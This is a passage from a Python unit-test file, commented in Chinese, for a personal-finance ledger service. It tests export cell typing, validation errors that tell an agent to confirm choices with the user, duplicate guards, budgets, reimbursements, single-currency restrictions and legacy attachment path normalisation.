        note = load_workbook(io.BytesIO(service.export_xlsx(self.ledger, {"from": "-999-12-01"})))["说明"]
        start = note.cell(3, 2)
        self.assertEqual((start.value, start.data_type), ("-999-12-01", "s"))
        self.assertTrue(start.quotePrefix)

    def test_malformed_category_shape_still_returns_the_422_agent_contract(self) -> None:
        """category 形状错位不得打穿校验语句本身。

        category 是写入面最外层的 Agent 输入，落库前没有形状闸。此前护栏直接 `.get("name")`，
        传成裸字符串 / 数组 / 数字时抛的是 AttributeError——不在捕获元组里，
        于是返回 {"error":"internal_error"}，而不是带 issues/valid/agentInstruction 的 422。
        那套 422 回执正是「AI 先问后写」的运转机制：形状错一个字符，Agent 就拿不到
        「向用户逐项列出选择并等待明确答复」的指令，只看到一句「服务器内部错误」。
        读取面同样被打穿：这类行一旦落库（manual 来源本就豁免护栏），
        预算、习惯与整个 dashboard 一起 500，用户的财务区无法自救。
        """
        for shape in ("查无此类", ["查无此类"], 42):
            with self.subTest(shape=shape):
                with self.assertRaises(DomainError) as raised:
                    self.transaction(source="openClaw", category=shape)
                payload = raised.exception.payload()
                self.assertEqual((raised.exception.code, raised.exception.status), ("unknown_master_data", 422))
                self.assertEqual([item["kind"] for item in payload["issues"]], ["category"])
                self.assertIn("categories", payload["valid"])
                self.assertIn("等待明确答复", payload["agentInstruction"])

        # 已知类别名的裸字符串是可解释的（名字正是全域聚合真正依赖的键），放行；
        # 而 manual 来源本就豁免护栏，这类行一定会落库，读取面必须扛得住。
        # 两行只有 category 不同，而去重护栏的身份键里没有 category：这里是「确实要两笔」，
        # 走用户确认后的逃生阀，而不是把护栏当成噪音绕开
        self.transaction(source="manual", category="餐饮")
        self.transaction(source="manual", category=[1, 2], allowDuplicate=True)
        for kind in ("summary", "budget", "dashboard", "habits"):
            with self.subTest(report=kind):
                self.assertIsInstance(service.reports(self.ledger, kind, {}), dict)
        self.assertTrue(service.export_xlsx(self.ledger, {}))

    def test_budget_uses_both_category_id_and_name(self) -> None:
        configuration = service.configuration(self.ledger); category = next(item for item in configuration["categories"] if item["name"] == "餐饮"); category["monthlyBudget"] = 100; configuration["categories"] = [category]
        service.update_configuration(self.ledger, configuration)
        # 两笔真实的 ¥25 午饭（一笔挂旧 id、一笔只有名字），秒级落库会撞上去重护栏，
        # 因此第二笔显式声明这是用户确认过的另一笔
        self.transaction(category={"id":"旧餐饮", "name":"餐饮"})
        status = service.reports(self.ledger, "budget", {"month": self.transaction(category={"name":"餐饮"}, allowDuplicate=True)["occurredAt"][:7]})
        self.assertEqual(status["items"][0]["spent"], 50)

    def test_agent_unknown_master_is_422_and_manual_is_allowed(self) -> None:
        with self.assertRaises(DomainError) as raised:
            self.transaction(source="agent", accountName="不存在账户")
        self.assertEqual(raised.exception.code, "unknown_master_data")
        self.assertEqual(self.transaction()["accountName"], "微信支付")

    def test_delete_income_cascades_only_its_reimbursements_and_checkpoints(self) -> None:
        expense = self.transaction(reimbursementStatus="draft")
        income = self.transaction(kind="income", accountName="微信支付", title="报销", category={"name":"工资"})
        service.settle_reimbursement(self.ledger, {"incomeId":income["id"], "settleIds":[expense["id"]]})
        service.delete_transaction(self.ledger, income["id"])
        items = {item["id"]: item for item in service.list_transactions(self.ledger, {"includeDeleted":"1"})}
        self.assertEqual(items[expense["id"]]["reimbursementStatus"], "draft")
        self.assertTrue(any((self.ledger.audit_root / "snapshots").glob("*.sqlite3")))

    def test_time_is_not_created_by_finance_operations(self) -> None:
        self.transaction(); self.assertFalse((self.ledger.db_path.parent / "time.sqlite3").exists())

    @patch("domains.finance.service.MVP_SINGLE_CURRENCY", False)
    def test_rate_refresh_reverses_provider_result_and_preserves_manual_currency(self) -> None:
        config = service.configuration(self.ledger); config["settings"]["exchangeRates"]["rates"]["XTS"] = 3.5; service.update_configuration(self.ledger, config)
        with patch("domains.finance.service.fetch_exchange_rates_from_api", return_value=({"CNY":1.0,"USD":7.0}, None)):
            rates = service.refresh_rates(self.ledger)
        self.assertEqual(rates["rates"]["USD"], 7.0)
        self.assertEqual(rates["rates"]["XTS"], 3.5)

    def test_mvp_rejects_foreign_currency_and_never_runs_recurring_catchup(self) -> None:
        with self.assertRaises(DomainError) as foreign:
            self.transaction(title="美元账目", amount=10, currency="USD")
        self.assertEqual(foreign.exception.code, "mvp_single_currency_only")

        with self.assertRaises(DomainError) as recurring:
            service.recurring(self.ledger, "create", payload={"name": "房租"})
        self.assertEqual(recurring.exception.code, "mvp_recurring_paused")
        self.assertEqual(service.recurring(self.ledger, "list"), [])
        self.assertEqual(service.catchup(self.ledger), {"generated": 0, "paused": True})

        configuration = service.configuration(self.ledger)
        configuration["settings"]["defaultCurrency"] = "USD"
        configuration["settings"]["exchangeRates"]["rates"]["USD"] = 7.3
        with self.assertRaises(DomainError) as rates:
            service.update_configuration(self.ledger, configuration)
        self.assertEqual(rates.exception.code, "mvp_single_currency_only")

        with self.assertRaises(DomainError) as refresh:
            service.refresh_rates(self.ledger)
        self.assertEqual(refresh.exception.code, "mvp_single_currency_only")

    def test_mvp_preserves_legacy_foreign_rows_but_blocks_their_monetary_mutation(self) -> None:
        with patch("domains.finance.service.MVP_SINGLE_CURRENCY", False):
            configuration = service.configuration(self.ledger)
            configuration["accounts"].append({
                "id": "legacy-usd", "name": "旧美元账户", "type": "cash", "currency": "USD",
                "openingBalance": 100, "ownership": "personal", "classification": "asset",
            })
            service.update_configuration(self.ledger, configuration)
            transaction = self.transaction(
                title="旧外币账目", amount=10, currency="USD", accountName="旧美元账户",
            )

        renamed = service.update_transaction(self.ledger, transaction["id"], {"title": "旧外币账目（备注更正）"})
        self.assertEqual(renamed["title"], "旧外币账目（备注更正）")
        with self.assertRaises(DomainError) as amount:
            service.update_transaction(self.ledger, transaction["id"], {"amount": 11})
        self.assertEqual(amount.exception.code, "mvp_single_currency_only")

        configuration = service.configuration(self.ledger)
        legacy = next(item for item in configuration["accounts"] if item["id"] == "legacy-usd")
        legacy["name"] = "旧美元账户（仅改名）"
        service.update_configuration(self.ledger, configuration)
        configuration = service.configuration(self.ledger)
        legacy = next(item for item in configuration["accounts"] if item["id"] == "legacy-usd")
        legacy["openingBalance"] = 101
        with self.assertRaises(DomainError) as opening_balance:
            service.update_configuration(self.ledger, configuration)
        self.assertEqual(opening_balance.exception.code, "mvp_single_currency_only")

    def test_legacy_attachment_absolute_path_is_normalized_inside_finance_runtime(self) -> None:
        transaction = self.transaction()
        relative = Path("attachments") / "legacy" / "proof.txt"
        target = self.ledger.db_path.parent / relative; target.parent.mkdir(parents=True); target.write_bytes(b"legacy-proof")
        connection = self.ledger.connect()
        try:
            connection.execute(
                "INSERT INTO attachments(id,transaction_id,mime,size_bytes,original_name,stored_path,created_at) VALUES(?,?,?,?,?,?,?)",
                ("legacy-attachment", transaction["id"], "text/plain", 12, "proof.txt", "/retired/FinOS/runtime/attachments/legacy/proof.txt", "2026-08-01T00:00:00+00:00"),
            ); connection.commit()
        finally: connection.close()
        service.ensure_schema(self.ledger)
        connection = self.ledger.connect()
        try: stored = connection.execute("SELECT stored_path FROM attachments WHERE id='legacy-attachment'").fetchone()["stored_path"]
        finally: connection.close()
        self.assertEqual(stored, relative.as_posix())
        metadata, body = service.read_attachment(self.ledger, "legacy-attachment")
        self.assertEqual((metadata["mime"], body), ("text/plain", b"legacy-proof"))


if __name__ == "__main__": unittest.main()
